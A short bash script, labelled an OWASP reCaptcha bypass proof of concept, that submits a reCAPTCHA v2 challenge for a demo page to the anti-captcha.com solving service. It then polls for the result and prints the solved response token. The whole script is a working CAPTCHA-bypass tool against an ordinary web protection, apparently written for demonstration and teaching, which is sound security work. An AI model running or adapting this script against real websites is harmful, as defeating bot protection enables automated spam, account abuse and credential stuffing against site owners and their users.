#!/bin/bash

echo -e "\n[ OWASP reCaptcha bypass PoC ]\n"

echo "[i] Creating reCaptcha V2 bypass task"

response=$(curl -s -H "Accept: application/json" \
     -H "Content-Type: application/json" \
     -X POST -d '{
    "clientKey":"ANTI-CAPTCHA-API-KEY",
    "task":
        {
            "type":"RecaptchaV2TaskProxyless",
            "websiteURL":"https://xss.vavkamil.cz/captcha/captcha.php",
            "websiteKey":"6Lf3s6smAAAAAJhW3or_xM30ZriJpD2zAHAKr2JY"
        },
    "softId": 0
}' https://api.anti-captcha.com/createTask)

taskId=$(echo "$response" | jq '.taskId')

echo -e "\t[i] Waiting 5 seconds for task to complete ...\n"

sleep 5

while true; do
    echo "[i] Requesting task solution"
    result=$(curl -s -H "Accept: application/json" \
         -H "Content-Type: application/json" \
         -X POST -d '{
        "clientKey":"ANTI-CAPTCHA-API-KEY",
        "taskId":'$taskId'
    }' https://api.anti-captcha.com/getTaskResult)

    status=$(echo "$result" | jq -r '.status')

    if [ "$status" == "ready" ]; then
        gRecaptchaResponse=$(echo "$result" | jq -r '.solution.gRecaptchaResponse')
        echo -e "\n[!] gRecaptchaResponse:\n\n$gRecaptchaResponse\n"
        break
    else
        echo -e "\t[i] Wait for 3 seconds before retrying ...\n"
        sleep 3
    fi
done
